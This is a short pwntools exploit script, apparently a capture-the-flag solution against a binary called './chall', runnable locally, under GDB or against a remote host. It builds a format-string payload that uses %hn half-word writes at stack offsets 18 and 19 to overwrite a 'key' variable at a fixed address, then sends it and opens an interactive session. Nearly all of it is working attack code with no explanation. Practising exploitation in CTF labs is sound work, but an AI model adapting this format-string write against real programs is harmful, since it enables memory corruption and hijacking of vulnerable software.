from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-peda
b* 0x080484a7
continue
'''.format(**locals())

#Binary filename
exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()

key = 0x0804a048

payload = f"%{0x0222}c%19$hn".encode()
payload += f"%{0x3322-0x222}c%18$hn".encode()

payload += p32(key) + p32(key + 2)

p.sendline(payload)

p.interactive()
